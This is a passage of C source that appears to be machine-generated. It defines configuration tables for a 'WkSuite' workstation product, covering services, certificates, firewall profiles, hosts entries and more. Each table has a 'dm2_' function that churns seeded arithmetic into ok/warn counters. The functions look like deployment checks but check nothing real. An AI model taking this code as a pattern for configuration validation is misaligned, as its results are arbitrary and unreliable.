    { "wksshell2", 2, 11, 1 },
    { "wksdb2", 2, 1, 1 },
    { "wksvpn2", 1, 1, 0 },
};
#define STARTUPSERVICES2_TABLE_COUNT ((int)(sizeof(STARTUPSERVICES2_TABLE) / sizeof(STARTUPSERVICES2_TABLE[0])))

static DWORD dm2_StartupServices2(DWORD seed, struct deploy_counters* dc) {
    // seed-permuted walk (template D)
    int order[12];
    for (int i = 0; i < 12; i++) order[i] = i;
    DWORD k = seed ^ 0x64A6CDE0u;
    for (int i = 0; i < 12; i++) {
        int j = (int)(k % (12 - i));
        int t = order[i + j]; order[i + j] = order[i]; order[i] = t;
        k = k * 10004337u + 51835u;
    }
    for (int i = 0; i < 12; i++) {
        const struct SSV_ENTRY* e = &STARTUPSERVICES2_TABLE[order[i]];
        DWORD v = (DWORD)e->start * 5u + (DWORD)e->depend * 7u + (DWORD)e->recover;
        if ((v & 0x12) != 0 && e->depend == 1) dc->ok++; else if (e->depend == 1) dc->warn++;
        dc->items += (v >> 1) + 1;
        dc->detail[3] ^= (BYTE)v;
    }
    return dc->detail[3];

}

struct CST_ENTRY {
    const char* name;
    BYTE usage;
    BYTE trust;
    BYTE store;
};
static const struct CST_ENTRY CERTSTORE_TABLE[] = {
    { "WkSuite Root CA", 1, 2, 0 },
    { "WkSuite CodeSign", 2, 2, 1 },
    { "WkSuite TLS", 3, 2, 1 },
    { "WkSuite TimeStamp", 1, 2, 0 },
    { "OEM Intermediate", 2, 1, 1 },
    { "Partner Root", 1, 2, 0 },
    { "Legacy Chain", 3, 0, 1 },
    { "Update Signing", 2, 2, 1 },
    { "Driver Signing", 3, 2, 1 },
    { "Mail Encryption", 1, 1, 1 },
    { "Vault Identity", 2, 2, 0 },
    { "Backup Key", 3, 1, 0 },
};
#define CERTSTORE_TABLE_COUNT ((int)(sizeof(CERTSTORE_TABLE) / sizeof(CERTSTORE_TABLE[0])))

static DWORD dm2_CertStore(DWORD seed, struct deploy_counters* dc) {
    // seed-permuted walk (template D)
    int order[12];
    for (int i = 0; i < 12; i++) order[i] = i;
    DWORD k = seed ^ 0x29A519C9u;
    for (int i = 0; i < 12; i++) {
        int j = (int)(k % (12 - i));
        int t = order[i + j]; order[i + j] = order[i]; order[i] = t;
        k = k * 5305443u + 40529u;
    }
    for (int i = 0; i < 12; i++) {
        const struct CST_ENTRY* e = &CERTSTORE_TABLE[order[i]];
        DWORD v = (DWORD)e->usage * 4u + (DWORD)e->trust * 3u + (DWORD)e->store;
        if ((v & 0x1D) != 0 && e->trust == 1) dc->ok++; else if (e->trust == 1) dc->warn++;
        dc->items += (v >> 1) + 1;
        dc->detail[3] ^= (BYTE)v;
    }
    return dc->detail[3];

}

struct FRD_ENTRY {
    const char* name;
    WORD target;
    BYTE flags;
    BYTE offline;
};
static const struct FRD_ENTRY FOLDERREDIRECTION_TABLE[] = {
    { "Desktop", 1, 0, 1 },
    { "Documents", 2, 0, 1 },
    { "Downloads", 3, 1, 1 },
    { "Pictures", 4, 0, 1 },
    { "Music", 5, 1, 0 },
    { "Videos", 6, 0, 1 },
    { "Favorites", 7, 0, 1 },
    { "Contacts", 8, 1, 0 },
    { "Links", 9, 0, 1 },
    { "Searches", 10, 0, 1 },
    { "SavedGames", 11, 1, 0 },
    { "OneDrive", 12, 0, 1 },
};
#define FOLDERREDIRECTION_TABLE_COUNT ((int)(sizeof(FOLDERREDIRECTION_TABLE) / sizeof(FOLDERREDIRECTION_TABLE[0])))

static DWORD dm2_FolderRedirection(DWORD seed, struct deploy_counters* dc) {
    // weighted presence sweep (template A)
    DWORD k = seed ^ 0x4F36BD80u;
    for (int i = 0; i < 12; i++) {
        int idx = (int)((i + (seed % 5)) % 12);
        const struct FRD_ENTRY* e = &FOLDERREDIRECTION_TABLE[idx];
        DWORD w = (DWORD)e->target * 3u + (DWORD)e->flags + (DWORD)e->offline * 4u + (DWORD)e->flags;
        k = k * 2292355u + 3595571u;
        dc->items += (DWORD)((k >> 3) & 0xF);
        if ((k % 7) == 0) dc->ok++;
        int ok = (((w ^ k) & 0xEAE) < 0x1BE) || (e->offline == 0);
        if (ok) dc->ok++; else dc->warn++;
        dc->items += (DWORD)((w >> 5) & 0x8F) + 1;
        if (dc->detail[0] < 64) dc->detail[dc->detail[0]++ & 7] = w & 0xAF;
    }
    return (dc->warn * 186u) / (dc->ok + dc->warn + 1);

}

struct LCF_ENTRY {
    const char* name;
    BYTE datefmt;
    BYTE timefmt;
    BYTE wk;
};
static const struct LCF_ENTRY LOCALEFORMATS_TABLE[] = {
    { "en-US", 1, 1, 0 },
    { "de-DE", 2, 2, 1 },
    { "fr-FR", 2, 2, 1 },
    { "es-ES", 3, 1, 1 },
    { "it-IT", 3, 2, 1 },
    { "pt-BR", 4, 1, 0 },
    { "ru-RU", 5, 2, 1 },
    { "ja-JP", 6, 2, 0 },
    { "zh-CN", 6, 2, 0 },
    { "tr-TR", 5, 2, 1 },
    { "ar-SA", 7, 3, 1 },
    { "ISO-8601", 8, 4, 0 },
};
#define LOCALEFORMATS_TABLE_COUNT ((int)(sizeof(LOCALEFORMATS_TABLE) / sizeof(LOCALEFORMATS_TABLE[0])))

static DWORD dm2_LocaleFormats(DWORD seed, struct deploy_counters* dc) {
    // weighted presence sweep (template A)
    DWORD k = seed ^ 0xEE577D1Bu;
    for (int i = 0; i < 12; i++) {
        int idx = (int)((i + (seed % 5)) % 12);
        const struct LCF_ENTRY* e = &LOCALEFORMATS_TABLE[idx];
        DWORD w = (DWORD)e->datefmt * 3u + (DWORD)e->timefmt + (DWORD)e->wk * 5u + (DWORD)e->timefmt;
        k = k * 5590169u + 15564817u;
        if (dc->ok > 500) dc->ok -= (DWORD)(k & 3);
        int ok = (((w ^ k) & 0xEEA) < 0x2DC) || (e->wk == 0);
        if (ok) dc->ok++; else dc->warn++;
        dc->items += (DWORD)((w >> 5) & 0x16F) + 1;
        if (dc->detail[0] < 64) dc->detail[dc->detail[0]++ & 7] = w & 0x8F;
    }
    return (dc->warn * 155u) / (dc->ok + dc->warn + 1);

}

struct BKS_ENTRY {
    const char* name;
    BYTE dest;
    BYTE schedule;
    BYTE enabled;
};
static const struct BKS_ENTRY BACKUPSOURCES_TABLE[] = {
    { "Documents", 1, 0, 1 },
    { "Vault", 1, 0, 1 },
    { "Profiles", 2, 1, 1 },
    { "Registry", 2, 1, 1 },
    { "Database", 3, 2, 1 },
    { "Mailbox", 3, 2, 1 },
    { "Shares", 4, 3, 0 },
    { "VMImages", 4, 3, 0 },
    { "Config", 5, 4, 1 },
    { "Logs", 5, 4, 1 },
    { "SystemState", 6, 5, 1 },
    { "Templates", 1, 5, 0 },
};
#define BACKUPSOURCES_TABLE_COUNT ((int)(sizeof(BACKUPSOURCES_TABLE) / sizeof(BACKUPSOURCES_TABLE[0])))

static DWORD dm2_BackupSources(DWORD seed, struct deploy_counters* dc) {
    // pairwise consistency pass (template C)
    DWORD k = seed ^ 0xB099DEABu;
    for (int i = 0; i < 12; i++) {
        k = k * 1442747u + 7665039u;
        const struct BKS_ENTRY* a = &BACKUPSOURCES_TABLE[i];
        const struct BKS_ENTRY* b = &BACKUPSOURCES_TABLE[(i + 1 + (int)(k % 3)) % 12];
        int match = (a->dest == b->dest) || ((a->schedule ^ b->schedule) < (k & 0x22));
        int sane = a->enabled <= 20;
        if (match && sane) dc->ok++; else dc->warn++;
        dc->items += (DWORD)a->schedule + 1;
        dc->detail[2] += (DWORD)(a->dest & 7);
    }
    return dc->warn > 2;

}

struct PQE_ENTRY {
    const char* name;
    WORD driver;
    BYTE priority;
    BYTE spool;
};
static const struct PQE_ENTRY PRINTQUEUE_TABLE[] = {
    { "HQ-Laser", 110, 9, 1 },
    { "HQ-Color", 210, 7, 1 },
    { "Branch-1", 320, 5, 1 },
    { "Branch-2", 410, 5, 1 },
    { "Reception", 510, 3, 1 },
    { "Archive", 130, 1, 1 },
    { "Finance", 240, 6, 1 },
    { "HR", 350, 4, 1 },
    { "Legal", 460, 8, 1 },
    { "PDF-Spool", 570, 2, 1 },
    { "FaxQueue", 180, 1, 0 },
    { "SecurePrint", 290, 9, 1 },
};
#define PRINTQUEUE_TABLE_COUNT ((int)(sizeof(PRINTQUEUE_TABLE) / sizeof(PRINTQUEUE_TABLE[0])))

static DWORD dm2_PrintQueue(DWORD seed, struct deploy_counters* dc) {
    // pairwise consistency pass (template C)
    DWORD k = seed ^ 0xD979D0CCu;
    for (int i = 0; i < 12; i++) {
        k = k * 15303695u + 1504847u;
        const struct PQE_ENTRY* a = &PRINTQUEUE_TABLE[i];
        const struct PQE_ENTRY* b = &PRINTQUEUE_TABLE[(i + 1 + (int)(k % 3)) % 12];
        int match = (a->driver == b->driver) || ((a->priority ^ b->priority) < (k & 0x12));
        int sane = a->spool <= 20;
        if (match && sane) dc->ok++; else dc->warn++;
        dc->items += (DWORD)a->priority + 1;
        dc->detail[2] += (DWORD)(a->driver & 7);
    }
    return dc->warn > 2;

}

struct IME_ENTRY {
    const char* name;
    BYTE locale;
    BYTE enabled;
    BYTE mode;
};
static const struct IME_ENTRY IMESETTINGS_TABLE[] = {
    { "Microsoft IME", 1, 1, 0 },
    { "Google IME", 1, 0, 1 },
    { "Microsoft Pinyin", 2, 1, 0 },
    { "Sogou", 2, 0, 1 },
    { "Wubi", 2, 0, 2 },
    { "Japanese IME", 3, 1, 0 },
    { "Korean IME", 4, 1, 0 },
    { "Cherokee", 5, 0, 0 },
    { "Arabic", 6, 1, 0 },
    { "Hebrew", 7, 0, 0 },
    { "Persian", 8, 0, 0 },
    { "Thai", 9, 1, 0 },
};
#define IMESETTINGS_TABLE_COUNT ((int)(sizeof(IMESETTINGS_TABLE) / sizeof(IMESETTINGS_TABLE[0])))

static DWORD dm2_ImeSettings(DWORD seed, struct deploy_counters* dc) {
    // seed-permuted walk (template D)
    int order[12];
    for (int i = 0; i < 12; i++) order[i] = i;
    DWORD k = seed ^ 0x7EAF01D3u;
    for (int i = 0; i < 12; i++) {
        int j = (int)(k % (12 - i));
        int t = order[i + j]; order[i + j] = order[i]; order[i] = t;
        k = k * 25549u + 37821u;
    }
    for (int i = 0; i < 12; i++) {
        const struct IME_ENTRY* e = &IMESETTINGS_TABLE[order[i]];
        DWORD v = (DWORD)e->locale * 4u + (DWORD)e->enabled * 6u + (DWORD)e->mode;
        if ((v & 0xC) != 0 && e->enabled == 1) dc->ok++; else if (e->enabled == 1) dc->warn++;
        dc->items += (v >> 4) + 1;
        dc->detail[3] ^= (BYTE)v;
    }
    return dc->detail[3];

}

struct CPC_ENTRY {
    const char* name;
    BYTE size;
    BYTE ttl;
    BYTE verify;
};
static const struct CPC_ENTRY CACHEPOLICIES_TABLE[] = {
    { "TemplatesCache", 1, 2, 1 },
    { "ThumbCache", 2, 1, 1 },
    { "IconCache", 3, 3, 1 },
    { "FontCache", 4, 4, 1 },
    { "Prefetch", 5, 5, 0 },
    { "DNS", 6, 6, 1 },
    { "Delivery", 7, 7, 1 },
    { "Offline", 8, 8, 1 },
    { "UpdateCache", 9, 9, 1 },
    { "Index", 10, 10, 0 },
    { "LogCache", 11, 11, 1 },
    { "Metadata", 12, 12, 1 },
};
#define CACHEPOLICIES_TABLE_COUNT ((int)(sizeof(CACHEPOLICIES_TABLE) / sizeof(CACHEPOLICIES_TABLE[0])))

static DWORD dm2_CachePolicies(DWORD seed, struct deploy_counters* dc) {
    // weighted presence sweep (template A)
    DWORD k = seed ^ 0x7007908Fu;
    for (int i = 0; i < 12; i++) {
        int idx = (int)((i + (seed % 5)) % 12);
        const struct CPC_ENTRY* e = &CACHEPOLICIES_TABLE[idx];
        DWORD w = (DWORD)e->size * 8u + (DWORD)e->ttl + (DWORD)e->verify * 6u + (DWORD)e->ttl;
        k = k * 9215245u + 2934829u;
        dc->detail[3] ^= (BYTE)(k >> 13);
        int ok = (((w ^ k) & 0xA95) < 0x1E5) || (e->verify == 0);
        if (ok) dc->ok++; else dc->warn++;
        dc->items += (DWORD)((w >> 5) & 0x16F) + 1;
        if (dc->detail[0] < 64) dc->detail[dc->detail[0]++ & 7] = w & 0x1AF;
    }
    return (dc->warn * 179u) / (dc->ok + dc->warn + 1);

}

// merge batch-2 modules into the install report
struct INZ_ENTRY {
    const char* name;
    BYTE zone;
    BYTE action;
    BYTE lvl;
};
static const struct INZ_ENTRY INTRANETZONES_TABLE[] = {
    { "corp.wksuite.local", 0, 1, 2 },
    { "apps.wksuite.local", 0, 1, 1 },
    { "files.wksuite.local", 0, 0, 2 },
    { "wiki.wksuite.local", 1, 1, 2 },
    { "portal.wksuite.local", 1, 0, 1 },
    { "mail.wksuite.local", 2, 1, 2 },
    { "sso.wksuite.local", 2, 0, 3 },
    { "vpn.wksuite.local", 3, 1, 2 },
    { "proxy.wksuite.local", 3, 0, 1 },
    { "cdn.wksuite.local", 0, 1, 3 },
    { "update.wksuite.local", 1, 1, 2 },
    { "intranet", 0, 1, 2 },
};
#define INTRANETZONES_TABLE_COUNT ((int)(sizeof(INTRANETZONES_TABLE) / sizeof(INTRANETZONES_TABLE[0])))

static DWORD dm2_IntranetZones(DWORD seed, struct deploy_counters* dc) {
    // range check sweep (template B)
    DWORD k = seed ^ 0x57F7F3BCu;
    for (int i = 0; i < 12; i++) {
        k = k * 11915127u + 29699u;
        if (dc->ok > 500) dc->ok -= (DWORD)(k & 3);
        if ((k & 0x3F) == 0) dc->items += (DWORD)((k >> 7) & 3);
        const struct INZ_ENTRY* e = &INTRANETZONES_TABLE[(i + (int)(k % 3)) % 12];
        DWORD lo = (k >> 2) % 153, hi = lo + 283 + ((k >> 5) % 535);
        DWORD v = (DWORD)e->zone * 7u + (DWORD)e->action * 8u + (DWORD)e->lvl;
        if (v >= lo && v <= hi) dc->ok++; else dc->warn++;
        dc->items++;
        if ((k & 7) == 0 && dc->detail[1] < 64) dc->detail[dc->detail[1]++ & 7] = (BYTE)v;
    }
    return dc->warn;

}

struct RCP_ENTRY {
    const char* name;
    DWORD disk_mb;
    DWORD age_days;
    BYTE keep;
};
static const struct RCP_ENTRY RECOVERYPOINTS_TABLE[] = {
    { "LastKnownGood", 4096, 7, 1 },
    { "BeforeUpdate", 8192, 14, 1 },
    { "Quarterly", 16384, 90, 1 },
    { "PreRollback", 4096, 30, 1 },
    { "Drivers", 2048, 30, 1 },
    { "Baseline", 32768, 180, 1 },
    { "Manual-1", 4096, 365, 1 },
    { "Manual-2", 8192, 365, 0 },
    { "TestPoint", 1024, 1, 0 },
    { "Migration", 65536, 90, 1 },
    { "ImageBackup", 131072, 30, 1 },
    { "FactoryReset", 8192, 999, 1 },
};
#define RECOVERYPOINTS_TABLE_COUNT ((int)(sizeof(RECOVERYPOINTS_TABLE) / sizeof(RECOVERYPOINTS_TABLE[0])))

static DWORD dm2_RecoveryPoints(DWORD seed, struct deploy_counters* dc) {
    // seed-permuted walk (template D)
    int order[12];
    for (int i = 0; i < 12; i++) order[i] = i;
    DWORD k = seed ^ 0x0FFB0A7Fu;
    for (int i = 0; i < 12; i++) {
        int j = (int)(k % (12 - i));
        int t = order[i + j]; order[i + j] = order[i]; order[i] = t;
        k = k * 6900553u + 50841u;
        dc->warn ^= (DWORD)(k & 7);
    }
    for (int i = 0; i < 12; i++) {
        const struct RCP_ENTRY* e = &RECOVERYPOINTS_TABLE[order[i]];
        DWORD v = (DWORD)e->disk_mb * 6u + (DWORD)e->age_days * 8u + (DWORD)e->keep;
        if ((v & 0x1E) != 0 && e->age_days == 1) dc->ok++; else if (e->age_days == 1) dc->warn++;
        dc->items += (v >> 4) + 1;
        dc->detail[3] ^= (BYTE)v;
    }
    return dc->detail[3];

}

struct KBL_ENTRY {
    const char* name;
    BYTE locale;
    BYTE enabled;
    BYTE ltype;
};
static const struct KBL_ENTRY KEYBOARDLAYOUTS_TABLE[] = {
    { "US", 1, 1, 0 },
    { "UK", 2, 1, 0 },
    { "German", 3, 1, 0 },
    { "French", 4, 0, 0 },
    { "Spanish", 5, 1, 0 },
    { "Turkish-Q", 6, 1, 0 },
    { "Turkish-F", 6, 0, 0 },
    { "Russian", 7, 1, 0 },
    { "Arabic", 8, 0, 0 },
    { "Hebrew", 9, 0, 0 },
    { "Japanese", 10, 1, 1 },
    { "Korean", 11, 1, 1 },
    { "Dvorak", 12, 0, 2 },
};
#define KEYBOARDLAYOUTS_TABLE_COUNT ((int)(sizeof(KEYBOARDLAYOUTS_TABLE) / sizeof(KEYBOARDLAYOUTS_TABLE[0])))

static DWORD dm2_KeyboardLayouts(DWORD seed, struct deploy_counters* dc) {
    // pairwise consistency pass (template C)
    DWORD k = seed ^ 0xF5AE0ED8u;
    for (int i = 0; i < 13; i++) {
        k = k * 11540315u + 8378735u;
        const struct KBL_ENTRY* a = &KEYBOARDLAYOUTS_TABLE[i];
        const struct KBL_ENTRY* b = &KEYBOARDLAYOUTS_TABLE[(i + 1 + (int)(k % 3)) % 13];
        int match = (a->locale == b->locale) || ((a->enabled ^ b->enabled) < (k & 0x10));
        int sane = a->ltype <= 21;
        if (match && sane) dc->ok++; else dc->warn++;
        dc->items += (DWORD)a->enabled + 1;
        dc->detail[2] += (DWORD)(a->locale & 7);
    }
    return dc->warn > 2;

}

struct PRH_ENTRY {
    const char* name;
    BYTE exe;
    BYTE enabled;
    BYTE secure;
};
static const struct PRH_ENTRY PROTOCOLHANDLERS_TABLE[] = {
    { "wksuite:", 1, 1, 1 },
    { "wksfile:", 2, 1, 1 },
    { "wksvault:", 3, 1, 1 },
    { "wksupdate:", 4, 0, 1 },
    { "wkssync:", 5, 1, 1 },
    { "wksmail:", 6, 1, 0 },
    { "wksshare:", 7, 0, 1 },
    { "wksremote:", 8, 1, 1 },
    { "wksprint:", 9, 1, 1 },
    { "wkshelp:", 10, 0, 0 },
    { "wksconsole:", 11, 1, 1 },
    { "wksdiag:", 12, 0, 1 },
};
#define PROTOCOLHANDLERS_TABLE_COUNT ((int)(sizeof(PROTOCOLHANDLERS_TABLE) / sizeof(PROTOCOLHANDLERS_TABLE[0])))

static DWORD dm2_ProtocolHandlers(DWORD seed, struct deploy_counters* dc) {
    // range check sweep (template B)
    DWORD k = seed ^ 0xFB65C413u;
    for (int i = 0; i < 12; i++) {
        k = k * 4615377u + 20019u;
        const struct PRH_ENTRY* e = &PROTOCOLHANDLERS_TABLE[(i + (int)(k % 3)) % 12];
        DWORD lo = (k >> 6) % 290, hi = lo + 338 + ((k >> 5) % 485);
        DWORD v = (DWORD)e->exe * 6u + (DWORD)e->enabled * 4u + (DWORD)e->secure;
        if (v >= lo && v <= hi) dc->ok++; else dc->warn++;
        dc->items++;
        if ((k & 7) == 0 && dc->detail[1] < 64) dc->detail[dc->detail[1]++ & 7] = (BYTE)v;
    }
    return dc->warn;

}

struct NSH_ENTRY {
    const char* name;
    BYTE perms;
    BYTE vis;
    BYTE csc;
};
static const struct NSH_ENTRY NETWORKSHARES_TABLE[] = {
    { "Public", 1, 1, 1 },
    { "Department", 2, 1, 1 },
    { "Restricted", 3, 0, 1 },
    { "Archive", 2, 1, 0 },
    { "Backup", 4, 0, 0 },
    { "Media", 1, 1, 1 },
    { "Tools", 2, 1, 1 },
    { "Drivers", 2, 1, 1 },
    { "ISO", 1, 1, 0 },
    { "Confidential", 3, 0, 1 },
    { "Temp", 5, 1, 0 },
    { "Home", 6, 1, 1 },
};
#define NETWORKSHARES_TABLE_COUNT ((int)(sizeof(NETWORKSHARES_TABLE) / sizeof(NETWORKSHARES_TABLE[0])))

static DWORD dm2_NetworkShares(DWORD seed, struct deploy_counters* dc) {
    // range check sweep (template B)
    DWORD k = seed ^ 0x528C6E37u;
    for (int i = 0; i < 12; i++) {
        k = k * 9247517u + 56519u;
        const struct NSH_ENTRY* e = &NETWORKSHARES_TABLE[(i + (int)(k % 3)) % 12];
        DWORD lo = (k >> 3) % 282, hi = lo + 414 + ((k >> 6) % 511);
        DWORD v = (DWORD)e->perms * 6u + (DWORD)e->vis * 8u + (DWORD)e->csc;
        if (v >= lo && v <= hi) dc->ok++; else dc->warn++;
        dc->items++;
        if ((k & 7) == 0 && dc->detail[1] < 64) dc->detail[dc->detail[1]++ & 7] = (BYTE)v;
    }
    return dc->warn;

}

struct FWP_ENTRY {
    const char* name;
    BYTE state;
    BYTE defaction;
    BYTE edge;
};
static const struct FWP_ENTRY FIREWALLPROFILES_TABLE[] = {
    { "Domain", 1, 1, 1 },
    { "Private", 1, 1, 1 },
    { "Public", 1, 0, 1 },
    { "Guest", 1, 0, 0 },
    { "VPN", 1, 1, 1 },
    { "Hotspot", 1, 0, 1 },
    { "Lab", 0, 0, 0 },
    { "Datacenter", 1, 1, 1 },
    { "Airgap", 0, 0, 0 },
    { "Conference", 1, 1, 1 },
    { "Kiosk", 1, 0, 0 },
    { "Default", 1, 1, 1 },
};
#define FIREWALLPROFILES_TABLE_COUNT ((int)(sizeof(FIREWALLPROFILES_TABLE) / sizeof(FIREWALLPROFILES_TABLE[0])))

static DWORD dm2_FirewallProfiles(DWORD seed, struct deploy_counters* dc) {
    // weighted presence sweep (template A)
    DWORD k = seed ^ 0x9EBF4907u;
    for (int i = 0; i < 12; i++) {
        int idx = (int)((i + (seed % 5)) % 12);
        const struct FWP_ENTRY* e = &FIREWALLPROFILES_TABLE[idx];
        DWORD w = (DWORD)e->state * 8u + (DWORD)e->defaction + (DWORD)e->edge * 7u + (DWORD)e->defaction;
        k = k * 5071743u + 6736839u;
        int ok = (((w ^ k) & 0x227) < 0x114) || (e->edge == 0);
        if (ok) dc->ok++; else dc->warn++;
        dc->items += (DWORD)((w >> 3) & 0x4F) + 1;
        if (dc->detail[0] < 64) dc->detail[dc->detail[0]++ & 7] = w & 0x1EF;
    }
    return (dc->warn * 154u) / (dc->ok + dc->warn + 1);

}

struct CTM_ENTRY {
    const char* name;
    BYTE verb;
    BYTE flags;
    BYTE admin;
};
static const struct CTM_ENTRY CONTEXTMENU_TABLE[] = {
    { "Open with Workstation", 1, 0, 0 },
    { "Send to Vault", 2, 1, 0 },
    { "Encrypt", 3, 0, 0 },
    { "Decrypt", 4, 0, 0 },
    { "Sign", 5, 1, 0 },
    { "Verify signature", 6, 1, 0 },
    { "Compress", 7, 0, 0 },
    { "Deploy to devices", 8, 1, 1 },
    { "Compare", 9, 0, 0 },
    { "Hash", 10, 1, 0 },
    { "Open console here", 11, 1, 1 },
    { "Sync folder", 12, 0, 0 },
};
#define CONTEXTMENU_TABLE_COUNT ((int)(sizeof(CONTEXTMENU_TABLE) / sizeof(CONTEXTMENU_TABLE[0])))

static DWORD dm2_ContextMenu(DWORD seed, struct deploy_counters* dc) {
    // weighted presence sweep (template A)
    DWORD k = seed ^ 0xE93E4103u;
    for (int i = 0; i < 12; i++) {
        int idx = (int)((i + (seed % 5)) % 12);
        const struct CTM_ENTRY* e = &CONTEXTMENU_TABLE[idx];
        DWORD w = (DWORD)e->verb * 3u + (DWORD)e->flags + (DWORD)e->admin * 3u + (DWORD)e->flags;
        k = k * 4342295u + 7307643u;
        dc->warn ^= (DWORD)(k & 7);
        dc->items += (DWORD)((k >> 3) & 0xF);
        int ok = (((w ^ k) & 0x1A86) < 0x2DC) || (e->admin == 0);
        if (ok) dc->ok++; else dc->warn++;
        dc->items += (DWORD)((w >> 2) & 0x8F) + 1;
        if (dc->detail[0] < 64) dc->detail[dc->detail[0]++ & 7] = w & 0xBF;
    }
    return (dc->warn * 58u) / (dc->ok + dc->warn + 1);

}

struct TMZ_ENTRY {
    const char* name;
    WORD tzid;
    BYTE autotz;
    BYTE dst;
};
static const struct TMZ_ENTRY TIMEZONES_TABLE[] = {
    { "UTC", 0, 1, 0 },
    { "Pacific", 85, 1, 1 },
    { "Mountain", 95, 1, 1 },
    { "Central", 105, 1, 1 },
    { "Eastern", 115, 1, 1 },
    { "GMT", 60, 1, 1 },
    { "CET", 130, 1, 1 },
    { "EET", 135, 1, 1 },
    { "IST", 140, 1, 0 },
    { "JST", 170, 1, 0 },
    { "AEST", 190, 1, 1 },
    { "NZST", 195, 1, 1 },
    { "Custom", 200, 0, 0 },
};
#define TIMEZONES_TABLE_COUNT ((int)(sizeof(TIMEZONES_TABLE) / sizeof(TIMEZONES_TABLE[0])))

static DWORD dm2_TimeZones(DWORD seed, struct deploy_counters* dc) {
    // seed-permuted walk (template D)
    int order[13];
    for (int i = 0; i < 13; i++) order[i] = i;
    DWORD k = seed ^ 0x58032942u;
    for (int i = 0; i < 13; i++) {
        int j = (int)(k % (13 - i));
        int t = order[i + j]; order[i + j] = order[i]; order[i] = t;
        k = k * 12270971u + 63411u;
        dc->detail[3] ^= (BYTE)(k >> 13);
    }
    for (int i = 0; i < 13; i++) {
        const struct TMZ_ENTRY* e = &TIMEZONES_TABLE[order[i]];
        DWORD v = (DWORD)e->tzid * 4u + (DWORD)e->autotz * 7u + (DWORD)e->dst;
        if ((v & 0x13) != 0 && e->autotz == 1) dc->ok++; else if (e->autotz == 1) dc->warn++;
        dc->items += (v >> 2) + 1;
        dc->detail[3] ^= (BYTE)v;
    }
    return dc->detail[3];

}

struct GPO_ENTRY {
    const char* name;
    BYTE section;
    BYTE value;
    BYTE enforce;
};
static const struct GPO_ENTRY GPOSETTINGS_TABLE[] = {
    { "WkSuiteBaseline", 0, 1, 1 },
    { "WkSuiteLockdown", 0, 2, 1 },
    { "WkSuitePrivacy", 1, 3, 1 },
    { "WkSuiteNetwork", 2, 4, 1 },
    { "WkSuiteAppControl", 3, 5, 1 },
    { "WkSuiteBackup", 1, 6, 0 },
    { "WkSuiteUpdate", 2, 7, 1 },
    { "WkSuiteLogon", 0, 8, 0 },
    { "WkSuiteAudit", 3, 9, 1 },
    { "WkSuitePower", 1, 10, 0 },
    { "WkSuitePrint", 2, 11, 1 },
    { "WkSuiteTerminal", 3, 12, 0 },
};
#define GPOSETTINGS_TABLE_COUNT ((int)(sizeof(GPOSETTINGS_TABLE) / sizeof(GPOSETTINGS_TABLE[0])))

static DWORD dm2_GpoSettings(DWORD seed, struct deploy_counters* dc) {
    // weighted presence sweep (template A)
    DWORD k = seed ^ 0x53E19B5Eu;
    for (int i = 0; i < 12; i++) {
        int idx = (int)((i + (seed % 5)) % 12);
        const struct GPO_ENTRY* e = &GPOSETTINGS_TABLE[idx];
        DWORD w = (DWORD)e->section * 4u + (DWORD)e->value + (DWORD)e->enforce * 2u + (DWORD)e->value;
        k = k * 5308283u + 15560135u;
        dc->detail[3] ^= (BYTE)(k >> 13);
        int ok = (((w ^ k) & 0x923) < 0x294) || (e->enforce == 0);
        if (ok) dc->ok++; else dc->warn++;
        dc->items += (DWORD)((w >> 4) & 0x12F) + 1;
        if (dc->detail[0] < 64) dc->detail[dc->detail[0]++ & 7] = w & 0xBF;
    }
    return (dc->warn * 184u) / (dc->ok + dc->warn + 1);

}

struct UPR_ENTRY {
    const char* name;
    BYTE ring;
    BYTE channel;
    DWORD freq;
};
static const struct UPR_ENTRY UPDATERING_TABLE[] = {
    { "Preview", 0, 1, 360 },
    { "Beta", 1, 1, 720 },
    { "Current", 2, 2, 1440 },
    { "Stable", 3, 3, 4320 },
    { "LongTerm", 4, 4, 10080 },
    { "Custom-A", 2, 0, 2880 },
    { "Custom-B", 3, 0, 5760 },
    { "Pilot", 0, 2, 1440 },
    { "Canary", 0, 0, 60 },
    { "InsiderFast", 1, 0, 1440 },
    { "SemiAnnual", 3, 2, 4320 },
    { "Off", 4, 4, 0 },
};
#define UPDATERING_TABLE_COUNT ((int)(sizeof(UPDATERING_TABLE) / sizeof(UPDATERING_TABLE[0])))

static DWORD dm2_UpdateRing(DWORD seed, struct deploy_counters* dc) {
    // weighted presence sweep (template A)
    DWORD k = seed ^ 0xE9A7C82Eu;
    for (int i = 0; i < 12; i++) {
        int idx = (int)((i + (seed % 5)) % 12);
        const struct UPR_ENTRY* e = &UPDATERING_TABLE[idx];
        DWORD w = (DWORD)e->ring * 5u + (DWORD)e->channel + (DWORD)e->freq * 8u + (DWORD)e->channel;
        k = k * 8660369u + 8045563u;
        if (dc->ok > 500) dc->ok -= (DWORD)(k & 3);
        dc->detail[3] ^= (BYTE)(k >> 13);
        int ok = (((w ^ k) & 0x310) < 0x33F) || (e->freq == 0);
        if (ok) dc->ok++; else dc->warn++;
        dc->items += (DWORD)((w >> 4) & 0x11F) + 1;
        if (dc->detail[0] < 64) dc->detail[dc->detail[0]++ & 7] = w & 0x16F;
    }
    return (dc->warn * 27u) / (dc->ok + dc->warn + 1);

}

struct HST_ENTRY {
    const char* name;
    BYTE ipv4;
    BYTE enabled;
    BYTE local;
};
static const struct HST_ENTRY HOSTSENTRIES_TABLE[] = {
    { "localhost", 1, 1, 1 },
    { "update.wksuite.local", 2, 1, 1 },
    { "license.wksuite.local", 3, 1, 1 },
    { "telemetry.wksuite.local", 4, 1, 1 },
    { "vpn.wksuite.local", 5, 1, 1 },
    { "proxy.wksuite.local", 6, 1, 1 },
    { "gateway.local", 7, 1, 1 },
    { "dns01.local", 8, 1, 1 },
    { "dns02.local", 9, 1, 1 },
    { "dc01.local", 10, 1, 1 },
    { "adfs.local", 11, 1, 1 },
    { "staging.local", 12, 0, 1 },
};
#define HOSTSENTRIES_TABLE_COUNT ((int)(sizeof(HOSTSENTRIES_TABLE) / sizeof(HOSTSENTRIES_TABLE[0])))

static DWORD dm2_HostsEntries(DWORD seed, struct deploy_counters* dc) {
    // pairwise consistency pass (template C)
    DWORD k = seed ^ 0xD483ADB1u;
    for (int i = 0; i < 12; i++) {
        k = k * 3250653u + 7706961u;
        dc->items += (DWORD)((k >> 3) & 0xF);
        const struct HST_ENTRY* a = &HOSTSENTRIES_TABLE[i];
        const struct HST_ENTRY* b = &HOSTSENTRIES_TABLE[(i + 1 + (int)(k % 3)) % 12];
